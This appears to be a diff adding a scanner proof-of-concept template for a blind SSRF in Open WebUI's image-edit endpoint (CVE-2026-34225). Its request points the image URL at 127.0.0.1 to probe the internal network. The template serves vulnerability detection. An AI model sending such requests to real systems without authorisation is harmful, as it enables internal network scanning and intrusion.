@@ -1,0 +1,27 @@
+[info]
+id = "POC-AVE-2026-0033"
+name = "Open WebUI 图像编辑功能盲 SSRF PoC"
+author = "AVE"
+severity = "medium"
+tags = ["ssrf", "cve-2026-34225", "open-webui"]
+description = "Open WebUI <= 0.7.2 的 /api/v1/images/edit 端点中，load_url_image 函数对用户提供的 HTTP/HTTPS URL 未做内网地址过滤，直接使用 requests.get 发起 GET 请求，导致盲 SSRF 漏洞。攻击者可通过响应差异对本地网络进行端口扫描。"
+vuln_id = ["CVE-2026-34225", "AVE-2026-0033"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/v1/images/edit"
+
+headers.Authorization = "Bearer <token>"
+headers.Content-Type = "application/json"
+
+body.type = "json"
+body.form_data.image = "http://127.0.0.1:3000/"
+body.form_data.prompt = "poc"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
